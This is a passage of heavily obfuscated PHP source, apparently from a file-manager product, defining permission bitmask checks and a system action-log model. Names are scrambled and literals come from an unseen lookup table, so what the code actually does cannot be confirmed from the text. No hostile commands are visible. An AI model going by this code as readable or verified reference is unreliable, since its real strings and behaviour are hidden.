$Ÿ°‚ïæ‡[2137] => 5, $Ÿ°‚ïæ‡[2138] => 1, $Ÿ°‚ïæ‡[2139] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($Ÿ°‚ïæ‡[514] => LNG($Ÿ°‚ïæ‡[2148]), $Ÿ°‚ïæ‡[2135] => $Ÿ°‚ïæ‡[2149], $Ÿ°‚ïæ‡[2137] => 6, $Ÿ°‚ïæ‡[2138] => 1, $Ÿ°‚ïæ‡[2139] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($Ÿ°‚ïæ‡[514] => LNG($Ÿ°‚ïæ‡[2150]), $Ÿ°‚ïæ‡[2135] => $Ÿ°‚ïæ‡[2151], $Ÿ°‚ïæ‡[2137] => 7, $Ÿ°‚ïæ‡[2138] => 1, $Ÿ°‚ïæ‡[2139] => 0)); return $¼¸øÀ°ù; } public static function authCheck($™Âßü ±, $¿‘èù­, $Ò¶û«Ò‰ = true) { $úşòÚè =& $_SERVER[áäÒ½¯Ç]; $™Âßü ± = intval($™Âßü ±); if ($Ò¶û«Ò‰) { if (KodUser::isRoot() && $GLOBALS[$úşòÚè[6]][$úşòÚè[2152]]) { return !0; } } if ($™Âßü ± <= 0) { return !1; } if (($™Âßü ± & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($™Âßü ± & $¿‘èù­); } public static function authCheckShow($£­æôò) { return self::authCheck($£­æôò, self::AUTH_SHOW); } public static function authCheckView($©áï˜ûö) { return self::authCheck($©áï˜ûö, self::AUTH_VIEW); } public static function authCheckDownload($Èœ‚Íä) { return self::authCheck($Èœ‚Íä, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ úÛ»–ó) { return self::authCheck($ úÛ»–ó, self::AUTH_UPLOAD); } public static function authCheckEdit($ç¨ÓÖÅµ) { return self::authCheck($ç¨ÓÖÅµ, self::AUTH_EDIT); } public static function authCheckRemove($¾ïâÃ½½) { return self::authCheck($¾ïâÃ½½, self::AUTH_REMOVE); } public static function authCheckShare($÷›ûî¼) { return self::authCheck($÷›ûî¼, self::AUTH_SHARE); } public static function authCheckComment($•ûöú€) { return self::authCheck($•ûöú€, self::AUTH_COMMENT); } public static function authCheckEvent($§ãóĞ¼á) { return self::authCheck($§ãóĞ¼á, self::AUTH_EVENT); } public static function authCheckRoot($Ø„©ŞíÖ) { return self::authCheck($Ø„©ŞíÖ, self::AUTH_ROOT); } public static function authCheckAction($ªëÕ™Ú›, $Ğ£ÛÆÍ) { $””·®¯ =& $_SERVER[áäÒ½¯Ç]; $å”™âÌ® = array($””·®¯[1509] => self::AUTH_SHOW, $””·®¯[1510] => self::AUTH_VIEW, $””·®¯[1331] => self::AUTH_DOWNLOAD, $””·®¯[108] => self::AUTH_UPLOAD, $””·®¯[1511] => self::AUTH_EDIT, $””·®¯[1280] => self::AUTH_REMOVE, $””·®¯[1512] => self::AUTH_SHARE, $””·®¯[439] => self::AUTH_COMMENT, $””·®¯[1513] => self::AUTH_EVENT, $””·®¯[1514] => self::AUTH_ROOT); if (!isset($å”™âÌ®[$Ğ£ÛÆÍ])) { return; } $ì×Í¤ó¦ = $å”™âÌ®[$Ğ£ÛÆÍ]; $ªëÕ™Ú› = intval($ªëÕ™Ú›); if ($ªëÕ™Ú› <= 0) { return !1; } if (($ªëÕ™Ú› & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ªëÕ™Ú› & $ì×Í¤ó¦); } public static function authDisable($ôäŞé­, $ˆ”¡¾ Ã) { if (intval($ôäŞé­) <= 0) { return 0; } return intval($ôäŞé­) & ~$ˆ”¡¾ Ã; } public $optionType = "\x53\x79\163\x74\x65\x6d\56\163\157\165\162\143\x65\x41\165\x74\x68\114\151\163\x74"; public $field = array("\156\x61\155\x65", "\x61\x75\x74\150", "\x6c\141\x62\145\154", "\144\x69\163\160\154\x61\171", "\163\x79\x73\x74\x65\x6d", "\x73\x6f\x72\x74"); public function initData() { $ûÛÆ£ì = $this->authDefault(); foreach ($ûÛÆ£ì as $ªŸÔ½ˆ) { $this->add($ªŸÔ½ˆ); } } public function findAuth($æƒôÊ©¤, $œ§Íª×ù) { $ øñğüÊ =& $_SERVER[áäÒ½¯Ç]; $–Äè°…â = parent::listData(); foreach ($–Äè°…â as $—·¶ÜÂ) { $Í¤ì•‰ = intval($—·¶ÜÂ[$ øñğüÊ[507]]); if ($Í¤ì•‰ <= 0 || $—·¶ÜÂ[$ øñğüÊ[2153]] == 0) { continue; } if (($Í¤ì•‰ & $æƒôÊ©¤) != $æƒôÊ©¤) { continue; } if (($Í¤ì•‰ & $œ§Íª×ù) != 0) { continue; } return $—·¶ÜÂ[$ øñğüÊ[492]]; } return !1; } public function findAuthMax($Äøí¨¾Ÿ, $¦ŒÍ•ÒÉ) { $°ÙŠÑ¶ =& $_SERVER[áäÒ½¯Ç]; $ÒíöóÉ× = !1; $ˆË‰³®ß = parent::listData(); foreach ($ˆË‰³®ß as $±à±ş) { $©ÍİÖÓı = intval($±à±ş[$°ÙŠÑ¶[507]]); if ($©ÍİÖÓı <= 0 || $±à±ş[$°ÙŠÑ¶[2153]] == 0) { continue; } if (($©ÍİÖÓı & $Äøí¨¾Ÿ) != $Äøí¨¾Ÿ) { continue; } if (($©ÍİÖÓı & $¦ŒÍ•ÒÉ) != 0) { continue; } if (!$ÒíöóÉ×) { $ÒíöóÉ× = $±à±ş; continue; } if (intval($ÒíöóÉ×[$°ÙŠÑ¶[507]]) < $©ÍİÖÓı) { $ÒíöóÉ× = $±à±ş; } } return $ÒíöóÉ× ? $ÒíöóÉ×[$°ÙŠÑ¶[492]] : !1; } public function findAuthReadOnly() { $”Œ¾ù·¦ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ş¹…€• = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($”Œ¾ù·¦, $ş¹…€•); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $Œ€Î™¶ =& $_SERVER[áäÒ½¯Ç]; $à¤Á»” = parent::listData(); $ç¦±³—Î = !1; foreach ($à¤Á»” as $øì¹™ü¾) { if ($øì¹™ü¾[$Œ€Î™¶[507]] <= 0 || $øì¹™ü¾[$Œ€Î™¶[2153]] == $Œ€Î™¶[239]) { continue; } if (!$ç¦±³—Î) { $ç¦±³—Î = $øì¹™ü¾; continue; } if ($ç¦±³—Î[$Œ€Î™¶[507]] > $øì¹™ü¾[$Œ€Î™¶[507]]) { $ç¦±³—Î = $øì¹™ü¾; } } return $ç¦±³—Î ? $ç¦±³—Î[$Œ€Î™¶[492]] : $Œ€Î™¶[12]; } public function listData($¢µÂŠø = false, $¢ÁÍŞé = "\x73\x6f\x72\x74", $ûªó ¸¦ = false) { return parent::listData($¢µÂŠø, $¢ÁÍŞé, $ûªó ¸¦); } public function update($•òê­»¹, $•à‘°) { $îºËÇ ™ =& $_SERVER[áäÒ½¯Ç]; $Êùì—ôÍ = parent::listData($•òê­»¹); $Ù„¦¨™” = $this->findByName($•à‘°[$îºËÇ ™[32]]); if (!$Êùì—ôÍ || $Ù„¦¨™” && $Ù„¦¨™”[$îºËÇ ™[492]] != $Êùì—ôÍ[$îºËÇ ™[492]]) { return !1; } $this->filterAuth($•à‘°[$îºËÇ ™[507]]); return parent::update($•òê­»¹, $•à‘°); } public function remove($›İª¾šª) { $ïÚÀÙş = parent::listData($›İª¾šª); if (!$ïÚÀÙş || $ïÚÀÙş[$_SERVER[áäÒ½¯Ç][190]]) { return !1; } return parent::remove($›İª¾šª); } public function add($¡œøˆå = array()) { $ÁÁŞƒØ³ =& $_SERVER[áäÒ½¯Ç]; if ($this->findByName($¡œøˆå[$ÁÁŞƒØ³[32]])) { return !1; } $…ˆˆÕÎû = array($ÁÁŞƒØ³[32] => $ÁÁŞƒØ³[12], $ÁÁŞƒØ³[507] => 1, $ÁÁŞƒØ³[2154] => $ÁÁŞƒØ³[2143], $ÁÁŞƒØ³[2153] => 1, $ÁÁŞƒØ³[190] => 0, $ÁÁŞƒØ³[2155] => 0); $¡œøˆå = array_merge($…ˆˆÕÎû, $¡œøˆå); $¡œøˆå[$ÁÁŞƒØ³[2155]] = $this->getSort(); $this->filterAuth($¡œøˆå[$ÁÁŞƒØ³[507]]); return parent::insert($¡œøˆå); } private function getSort() { $ä®½ÁØ =& $_SERVER[áäÒ½¯Ç]; $„Şèñ¦É = parent::listData(); $õäÉíºÇ = array_to_keyvalue($„Şèñ¦É, $ä®½ÁØ[12], $ä®½ÁØ[2155]); return empty($õäÉíºÇ) ? 0 : max($õäÉíºÇ) + 1; } private function filterAuth(&$†¯‘¼ƒ) { if (!$†¯‘¼ƒ) { return; } $»ÂÂÒ—– = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $œ×İï¥— = array(); foreach ($»ÂÂÒ—– as $¸œ¤¾†¡) { if ($†¯‘¼ƒ & $¸œ¤¾†¡) { $œ×İï¥—[] = $¸œ¤¾†¡; } } if (in_array(self::AUTH_ROOT, $œ×İï¥—)) { $†¯‘¼ƒ = array_sum($»ÂÂÒ—–); return; } $üˆ¶à = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($œ×İï¥— as $¸œ¤¾†¡) { if (isset($üˆ¶à[$¸œ¤¾†¡])) { $œ×İï¥— = array_merge($œ×İï¥—, $üˆ¶à[$¸œ¤¾†¡]); } } $œ×İï¥—[] = self::AUTH_SHOW; $†¯‘¼ƒ = array_sum(array_unique($œ×İï¥—)); } public function sort($Ï­ú’›, $Ÿî¢ÀĞç) { return parent::update($Ï­ú’›, $Ÿî¢ÀĞç); } } goto bÑŞõßÏ¥÷; bØ×Èâ®ì: class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\164\145\x6d\x5f\154\x6f\x67"; protected $dataAuto = array(array("\143\162\145\x61\164\145\124\151\x6d\145", "\164\151\x6d\145", "\x69\156\163\x65\x72\164", "\x66\165\156\143\164\151\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $˜ÀÀ’Ô— =& $_SERVER[áäÒ½¯Ç]; return array($˜ÀÀ’Ô—[2504] => LNG($˜ÀÀ’Ô—[2505]), $˜ÀÀ’Ô—[2506] => LNG($˜ÀÀ’Ô—[2507]), $˜ÀÀ’Ô—[2079] => LNG($˜ÀÀ’Ô—[2508]), $˜ÀÀ’Ô—[2509] => LNG($˜ÀÀ’Ô—[2510]), $˜ÀÀ’Ô—[2511] => LNG($˜ÀÀ’Ô—[2512]), $˜ÀÀ’Ô—[2513] => LNG($˜ÀÀ’Ô—[2514]), $˜ÀÀ’Ô—[2515] => LNG($˜ÀÀ’Ô—[2516]), $˜ÀÀ’Ô—[2107] => LNG($˜ÀÀ’Ô—[2516]), $˜ÀÀ’Ô—[2108] => LNG($˜ÀÀ’Ô—[2517]), $˜ÀÀ’Ô—[2518] => LNG($˜ÀÀ’Ô—[2519]), $˜ÀÀ’Ô—[2520] => LNG($˜ÀÀ’Ô—[2521]), $˜ÀÀ’Ô—[2522] => LNG($˜ÀÀ’Ô—[2523]), $˜ÀÀ’Ô—[2524] => LNG($˜ÀÀ’Ô—[2525]), $˜ÀÀ’Ô—[2105] => LNG($˜ÀÀ’Ô—[2526]), $˜ÀÀ’Ô—[2527] => LNG($˜ÀÀ’Ô—[2528]), $˜ÀÀ’Ô—[2112] => LNG($˜ÀÀ’Ô—[2529]), $˜ÀÀ’Ô—[2530] => LNG($˜ÀÀ’Ô—[2531]), $˜ÀÀ’Ô—[2532] => LNG($˜ÀÀ’Ô—[2533]), $˜ÀÀ’Ô—[2534] => LNG($˜ÀÀ’Ô—[2535]), $˜ÀÀ’Ô—[2536] => LNG($˜ÀÀ’Ô—[2537]), $˜ÀÀ’Ô—[2114] => LNG($˜ÀÀ’Ô—[2538]), $˜ÀÀ’Ô—[2115] => LNG($˜ÀÀ’Ô—[2539]), $˜ÀÀ’Ô—[2540] => LNG($˜ÀÀ’Ô—[2541]), $˜ÀÀ’Ô—[2542] => LNG($˜ÀÀ’Ô—[2543]), $˜ÀÀ’Ô—[2544] => LNG($˜ÀÀ’Ô—[2545]), $˜ÀÀ’Ô—[2110] => LNG($˜ÀÀ’Ô—[2546]), $˜ÀÀ’Ô—[2547] => LNG($˜ÀÀ’Ô—[2548]), $˜ÀÀ’Ô—[2109] => LNG($˜ÀÀ’Ô—[2549]), $˜ÀÀ’Ô—[2550] => LNG($˜ÀÀ’Ô—[2550]), $˜ÀÀ’Ô—[2551] => LNG($˜ÀÀ’Ô—[2552]), $˜ÀÀ’Ô—[2553] => LNG($˜ÀÀ’Ô—[2550]), $˜ÀÀ’Ô—[2554] => LNG($˜ÀÀ’Ô—[2555]), $˜ÀÀ’Ô—[2556] => LNG($˜ÀÀ’Ô—[2557]), $˜ÀÀ’Ô—[2558] => LNG($˜ÀÀ’Ô—[2557]), $˜ÀÀ’Ô—[2559] => LNG($˜ÀÀ’Ô—[2560]), $˜ÀÀ’Ô—[2561] => LNG($˜ÀÀ’Ô—[2561]), $˜ÀÀ’Ô—[2562] => LNG($˜ÀÀ’Ô—[2083]), $˜ÀÀ’Ô—[2563] => LNG($˜ÀÀ’Ô—[2564]), $˜ÀÀ’Ô—[2565] => LNG($˜ÀÀ’Ô—[2566]), $˜ÀÀ’Ô—[2567] => LNG($˜ÀÀ’Ô—[2568]), $˜ÀÀ’Ô—[2569] => LNG($˜ÀÀ’Ô—[2570]), $˜ÀÀ’Ô—[2571] => LNG($˜ÀÀ’Ô—[2572]), $˜ÀÀ’Ô—[2573] => LNG($˜ÀÀ’Ô—[2573]), $˜ÀÀ’Ô—[2574] => LNG($˜ÀÀ’Ô—[2575]), $˜ÀÀ’Ô—[2576] => LNG($˜ÀÀ’Ô—[2577]), $˜ÀÀ’Ô—[2578] => LNG($˜ÀÀ’Ô—[2579]), $˜ÀÀ’Ô—[2580] => LNG($˜ÀÀ’Ô—[2581]), $˜ÀÀ’Ô—[2582] => LNG($˜ÀÀ’Ô—[2583]), $˜ÀÀ’Ô—[2584] => LNG($˜ÀÀ’Ô—[2585]), $˜ÀÀ’Ô—[211] => LNG($˜ÀÀ’Ô—[211]), $˜ÀÀ’Ô—[212] => LNG($˜ÀÀ’Ô—[2586]), $˜ÀÀ’Ô—[2587] => LNG($˜ÀÀ’Ô—[2587])); } private function typeFile() { $¹¿şÍä =& $_SERVER[áäÒ½¯Ç]; $É¶ö Úî = array($¹¿şÍä[2112] => array($¹¿şÍä[2113]), $¹¿şÍä[2522] => array($¹¿şÍä[2588]), $¹¿şÍä[2524] => array($¹¿şÍä[2589]), $¹¿şÍä[2105] => array($¹¿şÍä[2106], $¹¿şÍä[2590]), $¹¿şÍä[2532] => array(), $¹¿şÍä[2534] => array(), $¹¿şÍä[2536] => array(), $¹¿şÍä[2114] => array($¹¿şÍä[2116]), $¹¿şÍä[2115] => array($¹¿şÍä[2116]), $¹¿şÍä[2540] => array($¹¿şÍä[2591]), $¹¿şÍä[2542] => array($¹¿şÍä[2591]), $¹¿şÍä[2544] => array($¹¿şÍä[2592]), $¹¿şÍä[2530] => array($¹¿şÍä[2593]), $¹¿şÍä[2110] => array($¹¿şÍä[2594]), $¹¿şÍä[2547] => array($¹¿şÍä[2595]), $¹¿şÍä[2109] => array($¹¿şÍä[2111])); return $É¶ö Úî; } private function typeAll() { $ÌãÜ¤º— =& $_SERVER[áäÒ½¯Ç]; $ÔÏ£À‰ = $this->typeList; $Ä»ÄÂ„ = array_filter($this->typeFile()); foreach ($Ä»ÄÂ„ as $ÙÀšøğ  => $ØŒ¨¨) { $ÔÏ£À‰[$ØŒ¨¨[0]] = $ÔÏ£À‰[$ÙÀšøğ ]; } $ÔÏ£À‰[$ÌãÜ¤º—[2116]] = LNG($ÌãÜ¤º—[2596]); $ÔÏ£À‰[$ÌãÜ¤º—[2591]] = LNG($ÌãÜ¤º—[2597]); return $ÔÏ£À‰; } public function addLog($©¾Öà, $ã—²×µ = array()) { $Š£¹®˜ê =& $_SERVER[áäÒ½¯Ç]; if (!isset($this->typeList[$©¾Öà])) { return; } $»²…¤¿Ù = Session::get($Š£¹®˜ê[2270]); if (!$»²…¤¿Ù) { $»²…¤¿Ù = _get($ã—²×µ, $Š£¹®˜ê[1542], 0); } if ($©¾Öà == $Š£¹®˜ê[2563] && is_array($ã—²×µ[$Š£¹®˜ê[2598]]) && !$ã—²×µ[$Š£¹®˜ê[2598]]) { return; } $È¢£¢Ç÷ = get_client_ip(); if (!$ã—²×µ || strlen(json_encode($ã—²×µ)) >= 1024 * 64) { if ($ã—²×µ && is_array($ã—²×µ)) { $ã—²×µ = array_intersect_key($ã—²×µ, array_flip($Š£¹®˜ê[492], $Š£¹®˜ê[32])); $ã—²×µ[$Š£¹®˜ê[1558]] = $È¢£¢Ç÷; } else { $ã—²×µ = array($Š£¹®˜ê[1558] => $È¢£¢Ç÷); } } else { if (is_array($ã—²×µ)) { $ã—²×µ[$Š£¹®˜ê[1558]] = $È¢£¢Ç÷; } else { $ã—²×µ = array($Š£¹®˜ê[1339] => $ã—²×µ, $Š£¹®˜ê[1558] => $È¢£¢Ç÷); } } $ã—²×µ[$Š£¹®˜ê[2599]] = ACTION; $ã—²×µ = array($Š£¹®˜ê[1917] => Session::sign(), $Š£¹®˜ê[1918] => intval($»²…¤¿Ù), $Š£¹®˜ê[33] => $©¾Öà, $Š£¹®˜ê[1920] => json_encode($ã—²×µ)); Hook::trigger($Š£¹®˜ê[2600], $ã—²×µ); return parent::add($ã—²×µ); } public function remove($öå¡Üò) { $this->where(array($_SERVER[áäÒ½¯Ç][513] => $öå¡Üò))->delete(); } private function _makeOrder($ÄİÅ Ç¿ = '') { $¸ÌñÅµĞ =& $_SERVER[áäÒ½¯Ç]; $ìò²“µŒ = $¸ÌñÅµĞ[242]; $«Ö”‡ü = array($¸ÌñÅµĞ[542] => $¸ÌñÅµĞ[543], $¸ÌñÅµĞ[544] => $¸ÌñÅµĞ[545]); $¡è¢šˆ“ = Input::get($¸ÌñÅµĞ[550], $¸ÌñÅµĞ[7], $¸ÌñÅµĞ[2308], array($¸ÌñÅµĞ[2226], $¸ÌñÅµĞ[544])); $¡è¢šˆ“ = $«Ö”‡ü[$¡è¢šˆ“]; $ÄİÅ Ç¿ = $ÄİÅ Ç¿ . "{$ìò²“µŒ}\x20{$¡è¢šˆ“}"; return $this->order($ÄİÅ Ç¿); } public function get($´ş¸ã‚ = '') { $Š×¤â¿ =& $_SERVER[áäÒ½¯Ç]; if (!$´ş¸ã‚) { show_json(array()); } $ÒöÚÔÄî = array(); if ($´ş¸ã‚[$Š×¤â¿[1542]]) { $ÒöÚÔÄî[$Š×¤â¿[1542]] = $´ş¸ã‚[$Š×¤â¿[1542]]; } if (isset($´ş¸ã‚[$Š×¤â¿[863]])) { $¿ƒ÷º–… = $´ş¸ã‚[$Š×¤â¿[863]]; $Éêœ¹¥€ = isset($´ş¸ã‚[$Š×¤â¿[864]]) ? $´ş¸ã‚[$Š×¤â¿[864]] : time(); $ÒöÚÔÄî[$Š×¤â¿[242]] = array($Š×¤â¿[418], array($¿ƒ÷º–…, $Éêœ¹¥€)); } if ($´ş¸ã‚[$Š×¤â¿[33]]) { $ï‰¢İŞ› = explode($Š×¤â¿[50], $´ş¸ã‚[$Š×¤â¿[33]]); $æñÑÎ²ˆ = $this->typeFile(); $·ªÎíº = array(); foreach ($ï‰¢İŞ› as $¹Şö‚®) { $·ªÎíº[] = $¹Şö‚®; if (isset($æñÑÎ²ˆ[$¹Şö‚®])) { $·ªÎíº = array_merge($·ªÎíº, $æñÑÎ²ˆ[$¹Şö‚®]); } } $·ªÎíº = array_unique($·ªÎíº); if ($·ªÎíº) { $ÒöÚÔÄî[$Š×¤â¿[33]] = array($Š×¤â¿[7], $·ªÎíº); } } else { $ÒöÚÔÄî[$Š×¤â¿[33]] = array($Š×¤â¿[2601], $Š×¤â¿[2602]); } if (!empty($´ş¸ã‚[$Š×¤â¿[1558]])) { $ÒöÚÔÄî[$Š×¤â¿[545]] = array($Š×¤â¿[479], "\x25{$´ş¸ã‚[$Š×¤â¿[1558]]}\x25"); } $Ï†ÒÕ = $this->_makeOrder()->where($ÒöÚÔÄî)->selectPage(); if (empty($Ï†ÒÕ[$Š×¤â¿[455]])) { show_json(array(), !0, $Ï†ÒÕ[$Š×¤â¿[452]]); } $Ï†ÒÕ[$Š×¤â¿[455]] = $this->logList($Ï†ÒÕ[$Š×¤â¿[455]]); return $Ï†ÒÕ; } private function ipAddress(&$¸ğ€¿†¿) { $Êú‘îïŞ =& $_SERVER[áäÒ½¯Ç]; if (!empty($¸ğ€¿†¿[$Êú‘îïŞ[1558]])) { $â³’Õµ = IpLocation::get($¸ğ€¿†¿[$Êú‘îïŞ[1558]]); } else { $â³’Õµ = LNG($Êú‘îïŞ[2603]); } $¸ğ€¿†¿[$Êú‘îïŞ[2604]] = $â³’Õµ; } private function descZipDownload($Ÿí Ğúı, &$Óº†ü¢Ÿ) { $å›öøİ… =& $_SERVER[áäÒ½¯Ç]; if (!isset($Ÿí Ğúı[$å›öøİ…[1565]])) { return; } $û¢›ğÄ‘ = json_decode($Ÿí Ğúı[$å›öøİ…[1565]], !0); foreach ($û¢›ğÄ‘ as $‰ûÀíƒ) { try { $­™¤ìÖ = IO::infoFullSimple($‰ûÀíƒ[$å›öøİ…[87]]); } catch (Exception $²¦ƒà”) { continue; } $Ÿí Ğúı[$å›öøİ…[87]] = $‰ûÀíƒ[$å›öøİ…[87]]; $Óº†ü¢Ÿ[] = $Ÿí Ğúı[$å›öøİ…[192]] = $­™¤ìÖ[$å›öøİ…[192]]; $Óº†ü¢Ÿ[] = $Ÿí Ğúı[$å›öøİ…[2368]] = $­™¤ìÖ[$å›öøİ…[191]]; break; } return $Ÿí Ğúı; } private function getSourceList(&$ù³Ñ›áš) { $À‹ñ’ÉÑ =& $_SERVER[áäÒ½¯Ç]; $† ®Åú = array(); foreach ($ù³Ñ›áš as $å‹ºä  => $÷ŞİÔÀÓ) { $«…øÙ = json_decode($÷ŞİÔÀÓ[$À‹ñ’ÉÑ[545]], !0); if ($÷ŞİÔÀÓ[$À‹ñ’ÉÑ[33]] == $À‹ñ’ÉÑ[2108]) { $«…øÙ = $this->descZipDownload($«…øÙ, $† ®Åú); $ù³Ñ›áš[$å‹ºä ][$À‹ñ’ÉÑ[545]] = json_encode($«…øÙ); continue; } if (strpos($÷ŞİÔÀÓ[$À‹ñ’ÉÑ[33]], $À‹ñ’ÉÑ[2370]) !== 0) { if (!isset($«…øÙ[$À‹ñ’ÉÑ[87]]) || strpos($÷ŞİÔÀÓ[$À‹ñ’ÉÑ[33]], $À‹ñ’ÉÑ[2605]) !== 0) { continue; } try { $–§Ü•‚ = IO::infoFullSimple($«…øÙ[$À‹ñ’ÉÑ[87]]); } catch (Exception $¾£¯å€) { continue; } $† ®Åú[] = $«…øÙ[$À‹ñ’ÉÑ[192]] = $–§Ü•‚[$À‹ñ’ÉÑ[192]]; $† ®Åú[] = $«…øÙ[$À‹ñ’ÉÑ[2368]] = $–§Ü•‚[$À‹ñ’ÉÑ[191]]; $ù³Ñ›áš[$å‹ºä ][$À‹ñ’ÉÑ[545]] = json_encode($«…øÙ); continue; } $† ®Åú[] = $«…øÙ[$À‹ñ’ÉÑ[192]]; $† ®Åú[] = $«…øÙ[$À‹ñ’ÉÑ[2368]]; if ($«…øÙ[$À‹ñ’ÉÑ[33]] == $À‹ñ’ÉÑ[648]) { $† ®Åú[] = $«…øÙ[$À‹ñ’ÉÑ[545]][$À‹ñ’ÉÑ[1292]]; $† ®Åú[] = $«…øÙ[$À‹ñ’ÉÑ[545]][$À‹ñ’ÉÑ[1293]]; } if ($«…øÙ[$À‹ñ’ÉÑ[33]] == $À‹ñ’ÉÑ[2378]) { $† ®Åú[] = $«…øÙ[$À‹ñ’ÉÑ[545]][$À‹ñ’ÉÑ[192]]; } } if (!$† ®Åú) { return array(); } return Model($À‹ñ’ÉÑ[935])->sourceListInfo($† ®Åú, !0); } private function logList($¨’ÄúØÂ) { $îïï‰‰ğ =& $_SERVER[áäÒ½¯Ç]; $Óí«Ï = array_to_keyvalue($¨’ÄúØÂ, $îïï‰‰ğ[12], $îïï‰‰ğ[1542]); $ú¬©®İò = Model($îïï‰‰ğ[622])->userListInfo(array_unique($Óí«Ï)); $ªµ’Î¤˜ = $this->getSourceList($¨’ÄúØÂ); $¶Á¤“”Ô = $this->typeAll(); $ıÒ”¸µú = array(); $®¹÷„‚Ö = array(); foreach ($¨’ÄúØÂ as $„°å—Æã => $İ÷‘Ù‰) { $ÈÅ‹Áß® = $İ÷‘Ù‰[$îïï‰‰ğ[33]]; $é±Ş—Åâ = isset($ú¬©®İò[$İ÷‘Ù‰[$îïï‰‰ğ[1542]]]) ? $ú¬©®İò[$İ÷‘Ù‰[$îïï‰‰ğ[1542]]] : !1; $ñ³©ˆò¬ = strpos($ÈÅ‹Áß®, $îïï‰‰ğ[2606]) === 0 ? LNG($îïï‰‰ğ[2607]) : LNG($îïï‰‰ğ[2603]); $İ÷‘Ù‰[$îïï‰‰ğ[32]] = isset($é±Ş—Åâ[$îïï‰‰ğ[32]]) ? $é±Ş—Åâ[$îïï‰‰ğ[32]] : LNG($îïï‰‰ğ[2603]); $İ÷‘Ù‰[$îïï‰‰ğ[2429]] = isset($é±Ş—Åâ[$îïï‰‰ğ[2429]]) ? $é±Ş—Åâ[$îïï‰‰ğ[2429]] : $îïï‰‰ğ[12]; $İ÷‘Ù‰[$îïï‰‰ğ[1815]] = isset($¶Á¤“”Ô[$ÈÅ‹Áß®]) ? $¶Á¤“”Ô[$ÈÅ‹Áß®] : $ñ³©ˆò¬; $İ÷‘Ù‰[$îïï‰‰ğ[2307]] = $é±Ş—Åâ; $“”±Çè” = json_decode($İ÷‘Ù‰[$îïï‰‰ğ[545]], !0); $İ÷‘Ù‰[$îïï‰‰ğ[1558]] = isset($“”±Çè”[$îïï‰‰ğ[1558]]) ? $“”±Çè”[$îïï‰‰ğ[1558]] : $îïï‰‰ğ[12]; $İ÷‘Ù‰[$îïï‰‰ğ[2604]] = IpLocation::get($İ÷‘Ù‰[$îïï‰‰ğ[1558]]); if (strpos($ÈÅ‹Áß®, $îïï‰‰ğ[2370]) === 0 || isset($“”±Çè”[$îïï‰‰ğ[2368]])) { $“”±Çè”[$îïï‰‰ğ[90]] = $ªµ’Î¤˜[$“”±Çè”[$îïï‰‰ğ[192]]]; $“”±Çè”[$îïï‰‰ğ[2383]] = $ªµ’Î¤˜[$“”±Çè”[$îïï‰‰ğ[2368]]]; if ($“”±Çè”[$îïï‰‰ğ[33]] == $îïï‰‰ğ[648]) { $“”±Çè”[$îïï‰‰ğ[545]][$îïï‰‰ğ[1292]] = $ªµ’Î¤˜[$“”±Çè”[$îïï‰‰ğ[545]][$îïï‰‰ğ[1292]]]; $“”±Çè”[$îïï‰‰ğ[545]][$îïï‰‰ğ[1293]] = $ªµ’Î¤˜[$“”±Çè”[$îïï‰‰ğ[545]][$îïï‰‰ğ[1293]]]; } if ($“”±Çè”[$îïï‰‰ğ[33]] == $îïï‰‰ğ[2378]) { $“”±Çè”[$îïï‰‰ğ[545]][$îïï‰‰ğ[192]] = $ªµ’Î¤˜[$“”±Çè”[$îïï‰‰ğ[545]][$îïï‰‰ğ[192]]]; } if ($“”±Çè”[$îïï‰‰ğ[33]] == $îïï‰‰ğ[1280]) { $“”±Çè”[$îïï‰‰ğ[2383]] = $“”±Çè”[$îïï‰‰ğ[90]]; $“”±Çè”[$îïï‰‰ğ[2368]] = $“”±Çè”[$îïï‰‰ğ[2383]][$îïï‰‰ğ[192]]; $“”±Çè”[$îïï‰‰ğ[90]] = !1; $“”±Çè”[$îïï‰‰ğ[192]] = $îïï‰‰ğ[12]; } $–İè”‹Ã = array($îïï‰‰ğ[1280], $îïï‰‰ğ[2366]); if (!in_array($“”±Çè”[$îïï‰‰ğ[33]], $–İè”‹Ã)) { if ($“”±Çè”[$îïï‰‰ğ[90]] && $“”±Çè”[$îïï‰‰ğ[90]][$îïï‰‰ğ[189]] == $îïï‰‰ğ[190]) { $®¹÷„‚Ö[] = $İ÷‘Ù‰[$îïï‰‰ğ[492]]; unset($¨’ÄúØÂ[$„°å—Æã]); continue; } if ($“”±Çè”[$îïï‰‰ğ[2383]] && $“”±Çè”[$îïï‰‰ğ[2383]][$îïï‰‰ğ[189]] == $îïï‰‰ğ[190]) { $®¹÷„‚Ö[] = $İ÷‘Ù‰[$îïï‰‰ğ[492]]; unset($¨’ÄúØÂ[$„°å—Æã]); continue; } } } $İ÷‘Ù‰[$îïï‰‰ğ[545]] = $“”±Çè”; unset($İ÷‘Ù‰[$îïï‰‰ğ[2608]]); $ıÒ”¸µú[] = $İ÷‘Ù‰; } $this->clearSystemPathLog($®¹÷„‚Ö); return $ıÒ”¸µú; } private function clearSystemPathLog($Û›èÊ…) { $İÉ†öÒ£ =& $_SERVER[áäÒ½¯Ç]; if (count($Û›èÊ…) == 0) { return; } 